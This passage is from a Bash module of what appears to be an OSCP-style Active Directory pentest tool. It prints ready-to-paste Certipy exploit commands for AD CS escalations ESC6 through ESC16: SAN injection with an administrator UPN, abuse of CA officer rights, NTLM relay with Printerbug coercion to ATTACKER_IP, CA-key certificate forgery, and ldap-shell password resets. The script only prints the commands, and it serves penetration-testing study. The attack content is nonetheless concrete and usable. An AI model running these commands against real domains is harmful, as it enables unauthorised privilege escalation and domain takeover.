        echo -e "${GRAY}  │  Note: abuse path depends on which object — may pivot via template or CA commands${NC}"
        echo -e "${GRAY}  │  Use BloodHound / LDAP ACL inspection to identify the exact writable object${NC}"
        ;;

    ESC6)
        echo -e "${CYAN}  │  Enumerate (CA-side EDITF_ATTRIBUTESUBJECTALTNAME2):${NC}"
        echo -e "${GRAY}  │  >> certipy-ad find -u '${U}' ${hash_flag} -dc-ip '${dc}' -vulnerable -enabled -stdout${NC}"
        echo -e "${CYAN}  │  Abuse — inject SAN via request attributes (like ESC1 but CA-side):${NC}"
        echo -e "${WHITE}  │  >> certipy-ad req -u '${U}' ${hash_flag} -dc-ip '${dc}' -ca '${ca}' -template '${tmpl}' -upn 'administrator@${dom}'${NC}"
        echo -e "${CYAN}  │  Authenticate:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad auth -pfx administrator.pfx -dc-ip '${dc}'${NC}"
        ;;

    ESC7)
        echo -e "${CYAN}  │  Enumerate CA permissions:${NC}"
        echo -e "${GRAY}  │  >> certipy-ad find -u '${U}' ${hash_flag} -dc-ip '${dc}' -vulnerable -enabled -stdout${NC}"
        echo -e "${GRAY}  │  >> certipy-ad ca  -u '${U}' ${hash_flag} -dc-ip '${dc}' -ca '${ca}' -list-templates${NC}"
        echo -e "${CYAN}  │  If you have ManageCA / Officer rights — approve a pending request:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad ca  -u '${U}' ${hash_flag} -dc-ip '${dc}' -ca '${ca}' -issue-request <ID>${NC}"
        echo -e "${CYAN}  │  Or enable SAN-in-request (turns CA into ESC6 state):${NC}"
        echo -e "${WHITE}  │  >> certipy-ad ca  -u '${U}' ${hash_flag} -dc-ip '${dc}' -ca '${ca}' -enable-template '${tmpl}'${NC}"
        echo -e "${GRAY}  │  Note: exact abuse depends on the delegated CA rights you hold${NC}"
        ;;

    ESC8)
        echo -e "${RED}  │  ⚠ OSCP: relay is active exploitation — run manually outside automated tool${NC}"
        echo -e "${CYAN}  │  NTLM relay to AD CS HTTP enrollment — requires relayable victim${NC}"
        echo -e "${GRAY}  │  Step 1 — Start Certipy relay listener:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad relay -target 'http://${dc}/certsrv/' -template DomainController${NC}"
        echo -e "${GRAY}  │  Step 2 — Coerce victim authentication (e.g. Printerbug / PetitPotam):${NC}"
        echo -e "${GRAY}  │  >> python3 printerbug.py '${dom}/${user}:${secret}@${dc}' ATTACKER_IP${NC}"
        echo -e "${GRAY}  │  Note: CA server may differ from DC — check certipy find output for CA DNS name${NC}"
        echo -e "${GRAY}  │  Note: -template User works for user relays; DomainController for DC coercion${NC}"
        ;;

    ESC9)
        echo -e "${CYAN}  │  Template lacks szOID_NTDS_CA_SECURITY_EXT — weaker identity binding${NC}"
        echo -e "${GRAY}  │  >> certipy-ad find -u '${U}' ${hash_flag} -dc-ip '${dc}' -vulnerable -enabled -stdout${NC}"
        echo -e "${CYAN}  │  Often chained with ESC10/ESC16 mapping weaknesses. Request cert:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad req -u '${U}' ${hash_flag} -dc-ip '${dc}' -ca '${ca}' -template '${tmpl}'${NC}"
        echo -e "${CYAN}  │  Authenticate and verify which account it maps to:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad auth -pfx ${user}.pfx -dc-ip '${dc}'${NC}"
        echo -e "${GRAY}  │  Note: impact depends on StrongCertificateBindingEnforcement registry value${NC}"
        ;;

    ESC10)
        echo -e "${CYAN}  │  Weak certificate mapping — environment-side issue${NC}"
        echo -e "${GRAY}  │  >> certipy-ad find -u '${U}' ${hash_flag} -dc-ip '${dc}' -vulnerable -enabled -stdout${NC}"
        echo -e "${CYAN}  │  Request cert and attempt auth:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad req -u '${U}' ${hash_flag} -dc-ip '${dc}' -ca '${ca}' -template '${tmpl}'${NC}"
        echo -e "${WHITE}  │  >> certipy-ad auth -pfx ${user}.pfx -dc-ip '${dc}'${NC}"
        echo -e "${GRAY}  │  Check: HKLM\\System\\CurrentControlSet\\Services\\Kdc\\StrongCertificateBindingEnforcement${NC}"
        echo -e "${GRAY}  │  Note: 0=weak(default pre-patch), 1=audit, 2=enforced${NC}"
        ;;

    ESC11)
        echo -e "${RED}  │  ⚠ OSCP: relay is active exploitation — run manually outside automated tool${NC}"
        echo -e "${CYAN}  │  NTLM relay to AD CS RPC/ICPR enrollment endpoint${NC}"
        echo -e "${GRAY}  │  Step 1 — Start Certipy relay listener (RPC target):${NC}"
        echo -e "${WHITE}  │  >> certipy-ad relay -target 'rpc://${dc}' -ca '${ca}' -template User${NC}"
        echo -e "${GRAY}  │  Step 2 — Coerce victim authentication:${NC}"
        echo -e "${GRAY}  │  >> python3 printerbug.py '${dom}/${user}:${secret}@${dc}' ATTACKER_IP${NC}"
        echo -e "${GRAY}  │  Note: unlike ESC8 this targets RPC port 135/dynamic, not HTTP${NC}"
        ;;

    ESC12)
        echo -e "${RED}  │  ⚠ OSCP: CA key abuse is highly destructive — requires manual access to CA${NC}"
        echo -e "${CYAN}  │  CA private key compromise — forge any cert in the domain${NC}"
        echo -e "${CYAN}  │  Enumerate CA key storage:${NC}"
        echo -e "${GRAY}  │  >> certipy-ad ca -u '${U}' ${hash_flag} -dc-ip '${dc}' -ca '${ca}'${NC}"
        echo -e "${CYAN}  │  If CA key is accessible — backup/export and forge:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad forge -ca-pfx <COMPROMISED_CA>.pfx -upn 'administrator@${dom}'${NC}"
        echo -e "${CYAN}  │  Authenticate with forged cert:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad auth -pfx administrator.pfx -dc-ip '${dc}'${NC}"
        echo -e "${GRAY}  │  Note: requires physical/admin access to CA server or backup media${NC}"
        ;;

    ESC13)
        echo -e "${CYAN}  │  Issuance policy OID linked to privileged group${NC}"
        echo -e "${GRAY}  │  >> certipy-ad find -u '${U}' ${hash_flag} -dc-ip '${dc}' -vulnerable -enabled -stdout${NC}"
        echo -e "${CYAN}  │  Request cert carrying the linked issuance policy:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad req -u '${U}' ${hash_flag} -dc-ip '${dc}' -ca '${ca}' -template '${tmpl}'${NC}"
        echo -e "${CYAN}  │  Authenticate — effective membership in linked group:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad auth -pfx ${user}.pfx -dc-ip '${dc}'${NC}"
        echo -e "${GRAY}  │  Note: check OID→group links in Configuration partition or certipy output${NC}"
        ;;

    ESC14)
        echo -e "${CYAN}  │  Explicit certificate mapping abuse${NC}"
        echo -e "${GRAY}  │  >> certipy-ad find -u '${U}' ${hash_flag} -dc-ip '${dc}' -vulnerable -enabled -stdout${NC}"
        echo -e "${CYAN}  │  Obtain or influence explicit mapping, then authenticate:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad req  -u '${U}' ${hash_flag} -dc-ip '${dc}' -ca '${ca}' -template '${tmpl}'${NC}"
        echo -e "${WHITE}  │  >> certipy-ad auth -pfx ${user}.pfx -dc-ip '${dc}'${NC}"
        echo -e "${GRAY}  │  Note: check altSecurityIdentities attribute on target accounts${NC}"
        ;;

    ESC15)
        echo -e "${CYAN}  │  Arbitrary application policy injection${NC}"
        echo -e "${GRAY}  │  >> certipy-ad find -u '${U}' ${hash_flag} -dc-ip '${dc}' -vulnerable -enabled -stdout${NC}"
        echo -e "${CYAN}  │  Request cert with injected application policy:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad req -u '${U}' ${hash_flag} -dc-ip '${dc}' -ca '${ca}' -template '${tmpl}'${NC}"
        echo -e "${GRAY}  │  Note: validate whether injected policies change how cert is trusted${NC}"
        ;;

    ESC16)
        echo -e "${CYAN}  │  CA globally disables security extension — domain-wide weaker binding${NC}"
        echo -e "${GRAY}  │  >> certipy-ad find -u '${U}' ${hash_flag} -dc-ip '${dc}' -vulnerable -enabled -stdout${NC}"
        echo -e "${CYAN}  │  Chain with ESC9/ESC10-style attack. Request and authenticate:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad req  -u '${U}' ${hash_flag} -dc-ip '${dc}' -ca '${ca}' -template '${tmpl}'${NC}"
        echo -e "${WHITE}  │  >> certipy-ad auth -pfx ${user}.pfx -dc-ip '${dc}'${NC}"
        echo -e "${GRAY}  │  Note: all templates on this CA are affected, not just one${NC}"
        ;;

    *)
        echo -e "${GRAY}  │  Unknown ESC type: ${esc} — run certipy-ad find for details${NC}"
        ;;
    esac

    echo -e "${YELLOW}  └────────────────────────────────────────────────────────────${NC}"
}

# ── Main dispatcher: prints commands for each ESC found ──────────────────────
adcs_print_esc_commands() {
    local esc_list="$1"    # space-separated e.g. "ESC1 ESC4"
    local user="$2"
    local cred_flag="$3"   # e.g. "-p 'pass'" or "-hashes ':hash'"
    local ca="$4"
    local tmpl="$5"
    local secret="$6"
    local ctype="$7"
    local ca_dns="${8:-}"  # CA DNS hostname (from certipy find DNS Name field)

    [[ -z "$esc_list" ]] && return

    echo -e "\n${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  EXPLOIT COMMANDS (copy-paste ready)                     ║${NC}"
    echo -e "${RED}║  Fill in: <CA_NAME> <TEMPLATE> <DC_IP> <DOMAIN>          ║${NC}"
    echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo -e "${YELLOW}  OSCP: These are MANUAL steps — the tool only prints them, never executes.${NC}"
    echo -e "${YELLOW}  Passive recon (find/enum) already ran above. Run exploit commands yourself.${NC}"

    local dom="${DOMAIN:-DOMAIN}"
    local dc="${DC_IP:-DC_IP}"

    local _target_arg=""
    [[ -n "$ca_dns" ]] && _target_arg="$ca_dns" || _target_arg="${dom}"
    for esc in $esc_list; do
        adcs_esc_commands "$esc" "$user" "$dom" "$dc" \
            "${ca:-CA_NAME}" "${tmpl:-TEMPLATE}" "$cred_flag" "$secret" "$ctype" "$_target_arg"
    done

    echo ""
    echo -e "${YELLOW}[*] Memory aid:${NC}"
    echo -e "${GRAY}    find → enumerate   req → request cert   auth → use cert${NC}"
    echo -e "${GRAY}    template → ESC4    ca → ESC7            relay → ESC8/ESC11${NC}"
    echo -e "${GRAY}    forge → ESC12 (CA key compromise)${NC}"
    echo ""
    echo -e "${YELLOW}[*] Save hash for offline cracking:${NC}"
    echo -e "${GRAY}    certipy-ad auth -pfx administrator.pfx -dc-ip '$dc' -ldap-shell${NC}"
    echo -e "${GRAY}    (ldap-shell lets you reset passwords / add to groups without hash)${NC}"
}

# ── Standalone help: adcs_esc_help [ESC1..ESC16 | all] ───────────────────────
# Usage: source modules/adcs.sh && adcs_esc_help ESC1
#        source modules/adcs.sh && adcs_esc_help all
adcs_esc_help() {
    local target="${1:-all}"

    # Need color vars — define locally if not already set (standalone use)
    RED="${RED:-\033[0;31m}"; GREEN="${GREEN:-\033[0;32m}"
    YELLOW="${YELLOW:-\033[1;33m}"; CYAN="${CYAN:-\033[0;96m}"
    GRAY="${GRAY:-\033[0;90m}"; WHITE="${WHITE:-\033[1;37m}"; NC="${NC:-\033[0m}"

    echo -e "\n${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  ADCS ESC REFERENCE  (ESC1 – ESC16)                       ║${NC}"
    echo -e "${RED}║  Usage: adcs_esc_help [ESC1|ESC4|all]                      ║${NC}"
    echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"

    local escs_to_show=()
    if [[ "${target,,}" == "all" ]]; then
        escs_to_show=(ESC1 ESC2 ESC3 ESC4 ESC5 ESC6 ESC7 ESC8
                      ESC9 ESC10 ESC11 ESC12 ESC13 ESC14 ESC15 ESC16)
    else
        escs_to_show=("${target^^}")
    fi

    for esc in "${escs_to_show[@]}"; do
        echo -e "\n${YELLOW}  ${esc}${NC} — $(adcs_esc_description "$esc")"
        adcs_esc_commands "$esc" "USER" "DOMAIN" "DC_IP" "CA_NAME" "TEMPLATE" \
            "-p 'PASSWORD'" "PASSWORD" "password"
    done
}

# ── --adcs-help flag handler (runs at source time if flag present) ────────────
if [[ "${1:-}" == "--adcs-help" || "${1:-}" == "--esc-help" ]]; then
    adcs_esc_help "${2:-all}"
    exit 0
fi
